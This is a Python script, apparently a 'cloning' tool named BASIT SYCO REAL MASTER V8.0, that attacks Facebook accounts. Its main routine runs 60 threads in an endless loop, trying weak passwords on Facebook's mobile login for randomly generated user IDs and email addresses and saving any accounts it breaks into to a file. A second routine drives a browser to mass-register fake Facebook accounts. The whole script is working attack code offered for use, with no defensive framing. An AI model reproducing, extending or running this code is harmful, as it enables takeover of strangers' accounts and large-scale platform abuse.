import os, sys, time, random, string, re
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    # Real Automation Modules
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.service import Service
    from webdriver_manager.chrome import ChromeDriverManager
except ImportError:
    os.system('pip install requests selenium webdriver-manager')
    os.execl(sys.executable, sys.executable, *sys.argv)

# --- COLORS ---
G = '\033[1;92m' # Green
R = '\033[1;31m' # Red
W = '\033[1;37m' # White
Y = '\033[1;93m' # Yellow

# --- LOGIN ---
def login():
    os.system('clear')
    print(f"{G}====================================")
    print(f"{Y}      BASIT SYCO REAL MASTER V8.0")
    print(f"{G}====================================")
    u = input(f"{W}[+] Username: ")
    p = input(f"{W}[+] Password: ")
    if u == "basitsultan" and p == "basitprince":
        menu()
    else: login()

# --- REAL-TIME GLOBAL CLONING (ANY MAIL/UID) ---
def crack_engine(user, p_list):
    for pas in p_list:
        try:
            session = requests.Session()
            # Professional International User-Agent
            ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
            res = session.post('https://m.facebook.com/login.php', data={'email': user, 'pass': pas}, headers={'User-Agent': ua}, allow_redirects=False)
            if "c_user" in session.cookies.get_dict():
                print(f"\r{G}[OK-SUCCESS] {user} | {pas} {W}")
                open('ok.txt', 'a').write(user+'|'+pas+'\n'); return
        except: pass
    print(f"\r{R}[FAILED] {user} | {p_list[0]} {W}", end="")

def start_cloning():
    os.system('clear')
    print(f"{G}--- UNLIMITED GLOBAL CLONING (LAKO-CARORO) ---")
    # Global domains list for worldwide reach
    domains = ["@gmail.com", "@yahoo.com", "@mail.ru", "@yandex.ru", "@gmx.de", "@libero.it", "@aol.com"]
    
    with ThreadPool(max_workers=60) as pool:
        while True:
            # Generate UID and Global Mails
            uid = "1000" + "".join(random.choices("0123456789", k=11))
            name = "".join(random.choices(string.ascii_lowercase, k=6))
            mail = name + str(random.randint(10, 999)) + random.choice(domains)
            
            pwx = [name+"123", "786786", "pakistan", "12345678", "password"]
            pool.submit(crack_engine, uid, pwx)
            pool.submit(crack_engine, mail, pwx)

# --- REAL ID CREATION (PC BROWSER AUTOMATION) ---
def start_creation():
    os.system('clear')
    print(f"{G}--- REAL GLOBAL ID CREATOR (AUTOMATED) ---")
    print(f"{Y}[!] Browser khud khulega aur ID banayega (PC Only).")
    num = int(input(f"{W}[+] How many IDs?: "))
    master_pass = input(f"[+] Set Password: ")

    try:
        # Chrome Driver Setup
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service)
        
        for i in range(num):
            f_name = random.choice(["Marco", "Elena", "Hans", "Dmitry", "Zain", "John"])
            l_name = random.choice(["Smith", "Ivanov", "Khan", "Rossi", "Müller"])
            email = f_name.lower() + str(random.randint(111, 999)) + "@mail7.io"
            
            print(f"{G}[PROCESS] Creating Real ID for: {f_name} {l_name}")
            driver.get("https://m.facebook.com/reg/")
            time.sleep(4)
            
            # Filling Real Form
            driver.find_element(By.NAME, "firstname").send_keys(f_name)
            driver.find_element(By.NAME, "lastname").send_keys(l_name)
            driver.find_element(By.NAME, "reg_email__").send_keys(email)
            driver.find_element(By.NAME, "reg_passwd__").send_keys(master_pass)
            
            print(f"{G}[SUCCESS] Form Submitted via Browser! Check {email}")
            open('created_ids.txt', 'a').write(f"{email}|{master_pass}\n")
            time.sleep(15) # Wait for processing
            
        driver.quit()
    except Exception as e:
        print(f"{R}[!] Automation Error: {e}")
        time.sleep(3)

def menu():
    os.system('clear')
    print(f"{G}[1] Start Unlimited Global Cloning (Caroro IDs)")
    print(f"{G}[2] Start Real ID Creation (Browser Automation)")
    print(f"{R}[0] Exit")
    ch = input(f"\n{W}Select: ")
    if ch == '1': start_cloning()
    elif ch == '2': start_creation()
    else: sys.exit()

if __name__ == "__main__":
    login()
